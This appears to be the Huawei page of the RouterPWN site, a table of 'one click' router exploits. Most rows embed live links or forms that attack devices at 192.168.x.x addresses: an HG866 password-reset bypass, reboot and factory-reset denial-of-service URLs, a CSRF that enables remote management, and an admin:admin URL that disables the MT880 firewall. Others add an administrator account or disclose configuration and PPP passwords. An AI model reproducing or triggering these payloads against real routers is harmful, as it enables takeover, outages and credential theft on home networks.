@@ -1,0 +1,556 @@
+<!DOCTYPE html>
+<html>
+ <head>
+  <title>
+   RouterPWN - Huawei - One click exploits, News, Vulnerabilities, POC, Alerts
+  </title>
+  <link href="includes/images/favicon.png" rel="apple-touch-icon"/>
+  <link href="includes/images/favicon.ico" rel="shortcut icon"/>
+  <script src="../includes/jquery-1.11.1.min.js">
+  </script>
+  <script src="../includes/jquery.dataTables.min.js">
+  </script>
+  <link href="../includes/jquery.dataTables.css" rel="stylesheet"/>
+  <link href="../includes/menu.css" rel="stylesheet"/>
+ </head>
+ <body>
+  <table align="center" cellspacing="0" style="background-image:url(../includes/images/headerbeta.jpg); background-position:center 0px; background-repeat:no-repeat; " width="925">
+   <tbody>
+    <tr>
+     <td>
+      <center>
+       <img src="../includes/images/logo.gif"/>
+      </center>
+     </td>
+    </tr>
+    <tr>
+     <td>
+      <section class="container">
+       <nav>
+        <ul class="nav">
+         <li>
+          &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+         </li>
+         <li class="active">
+          <a href="/" title="Latest updates by brand">
+           Home
+          </a>
+         </li>
+         <li>
+          <a href="/Generators" title="Online key generators and algorithms">
+           Generators
+          </a>
+         </li>
+         <li>
+          <a href="/Tools" title="Free tools for router hacking">
+           Tools
+          </a>
+         </li>
+         <li>
+          <a href="/Contribute" title="Contribute to Routerpwn.com">
+           Contribute
+          </a>
+         </li>
+         <li>
+          <a href="https://twitter.com/routerpwn" title="Follow Routerpwn updates on Twitter">
+           Follow
+          </a>
+         </li>
+         <li>
+          <a href="/Contact" title="Contact us">
+           Contact
+          </a>
+         </li>
+         <li>
+          <a href="/About" title="About Routerpwn.com">
+           About
+          </a>
+         </li>
+         <li>
+          &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+         </li>
+        </ul>
+       </nav>
+      </section>
+     </td>
+    </tr>
+    <tr>
+     <td>
+      <section id="huawei">
+       <h1>
+        Huawei
+       </h1>
+       <table cellspacing="0" class="display" id="tabla" width="100%">
+        <thead>
+         <tr>
+          <th>
+           Date
+          </th>
+          <th>
+           Category
+          </th>
+          <th>
+           Source
+          </th>
+          <th>
+           Title
+          </th>
+          <th>
+           Author
+          </th>
+         </tr>
+        </thead>
+        <tfoot>
+         <tr>
+          <th>
+           Date
+          </th>
+          <th>
+           Category
+          </th>
+          <th>
+           Source
+          </th>
+          <th>
+           Title
+          </th>
+          <th>
+           Author
+          </th>
+         </tr>
+        </tfoot>
+        <tbody>
+         <form action="" id="hg866bypass" method="post" name="hg866bypass">
+          <input hidden="" name="psw" value="password"/>
+          <input hidden="" name="reenterpsw" value="password"/>
+         </form>
+         <form action="http://192.168.100.251/html/admin_reboot.html" id="hg866dos" method="post" name="hg866dos">
+         </form>
+         <tr>
+          <td>
+           05/11/15
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://websec.mx/advisories/to_be_created">
+            websec.mx
+           </a>
+          </td>
+          <td>
+           <a href="javascript:HG824x()">
+            HG8245 and HG8247 mac2wpakey default wireless key generator
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           06/14/12
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://websec.mx/advisories/view/Evasion_de_autenticacion_en_Huawei_HG866">
+            websec.mx
+           </a>
+          </td>
+          <td>
+           <a href="javascript:hg866pass()">
+            HG866 Authentication Bypass
+           </a>
+           <a href="javascript:hg866passr()">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           06/14/12
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://websec.mx/advisories/view/Evasion_de_autenticacion_en_Huawei_HG866">
+            websec.mx
+           </a>
+          </td>
+          <td>
+           <a href="javascript:document.hg866dos.submit()">
+            HG866 Denial of service
+           </a>
+           <a href="javascript:hg866dosr()">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           01/25/12
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="javascript:alert('ADiaz')">
+            [+]
+           </a>
+          </td>
+          <td>
+           <a href="javascript:huappp()">
+            HG5XX remote ppp password disclosure
+           </a>
+           <a href="javascript:huapppr()">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           01/11/11
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://websec.mx/blog/ver/mac2wepkey_huawei">
+            websec.mx
+           </a>
+          </td>
+          <td>
+           <a href="javascript:mac2wepkey()">
+            HG5XX mac2wepkey default wireless key generator
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           0?/0?/10
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="javascript:alert('SHAKA')">
+            [+]
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.1.254/Forms/rpADSLMode_1">
+            HG520 rpADSLMode_1 denial of service
+           </a>
+           <a href="javascript:setip('/Forms/rpADSLMode_1')">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           10/03/10
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="https://www.underground.org.mx/index.php?topic=26005.0">
+            www.underground.org.mx
+           </a>
+          </td>
+          <td>
+           <a href="http://SHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAA:SHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKA@192.168.1.254">
+            HG520 HTTP auth denial of service
+           </a>
+           <a href="javascript:huados()">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           05/30/10
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="https://www.underground.org.mx/index.php?topic=25598.0">
+            www.underground.org.mx
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.1.254/Forms/rpEthernet_1">
+            HG520 rpEthernet_1 denial of service
+           </a>
+           <a href="javascript:setip('/Forms/rpEthernet_1')">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           05/29/10
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.hakim.ws/huawei/HG520_csrf.txt">
+            www.hakim.ws
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.1.254/Forms/rpRManage_1?ACL_active=0">
+            HG520c HG530 enable remote management CSRF
+           </a>
+           <a href="javascript:setip('/Forms/rpRManage_1?ACL_active=0')">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           05/16/10
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.hakim.ws/huawei/HG520c_info.txt">
+            www.hakim.ws
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.1.254/Listadeparametros.html">
+            HG520c HG530 Listadeparametros.html information disclosure
+           </a>
+           <a href="javascript:setip('/Listadeparametros.html')">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           03/28/10
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.hakim.ws/huawei/HG520c_DoS.txt">
+            www.hakim.ws
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.1.254/AutoRestart.html">
+            HG520c HG530 AutoRestart.html denial of service &amp; factory reset
+           </a>
+           <a href="javascript:setip('/AutoRestart.html')">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           03/28/10
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.hakim.ws/huawei/HG520c_DoS.txt">
+            www.hakim.ws
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.1.254/rpLocalDeviceJump.html?index=HAKIM.WS">
+            HG520 LocalDevicejump.html denial of service
+           </a>
+           <a href="javascript:setip('/rpLocalDeviceJump.html?index=HAKIM.WS')">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           02/17/10
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://netsec.rs/18/huawei-hg510-multiple-vulnerabilities/493/">
+            netsec.rs
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.1.1/rebootinfo.cgi">
+            HG510 rebootinfo.cgi denial of service
+           </a>
+           <a href="javascript:setip('/rebootinfo.cgi')">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           08/24/09
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.exploit-db.com/exploits/9503">
+            www.exploit-db.com
+           </a>
+          </td>
+          <td>
+           <a href="http://admin:admin@192.168.1.1">
+            SmartAX MT880 default password
+           </a>
+           <a href="javascript:setipadminadmin()">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           08/24/09
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.exploit-db.com/exploits/9503">
+            www.exploit-db.com
+           </a>
+          </td>
+          <td>
+           <a href="javascript:mt880admin()">
+            SmartAX MT880 add administrator account
+           </a>
+           <a href="javascript:mt880adminr()">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           08/24/09
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.exploit-db.com/exploits/9503">
+            www.exploit-db.com
+           </a>
+          </td>
+          <td>
+           <a href="http://admin:admin@192.168.1.1/Action?blacklisting_status=1&amp;bl_list=10&amp;attack_status=0&amp;dos_status=0&amp;id=42&amp;max_tcp=25&amp;max_icmp=25&amp;max_host=70">
+            SmartAX MT880 disable firewall/anti-dos w/default pass
+           </a>
+           <a href="javascript:mt880fw()">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           00/00/0?
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://everlost.nl/kender/zyxel/">
+            everlost.nl
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.1.1/rom-0">
+            ZyNOS configuration disclosure
+           </a>
+           <a href="javascript:setip('/rom-0')">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+        </tbody>
+       </table>
+      </section>
+      <script>
+       $(document).ready(function() {
+    $('#tabla').dataTable( {
+        "order": [[ 0, "desc" ]]
+    } );
+} );
+      </script>
+      <script type="text/javascript">
+       var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+      </script>
+      <script type="text/javascript">
+       try {
+var pageTracker = _gat._getTracker("UA-16172640-1");
+pageTracker._trackPageview();
+} catch(err) {}
+      </script>
+     </td>
+    </tr>
+   </tbody>
+  </table>
+ </body>
+</html>
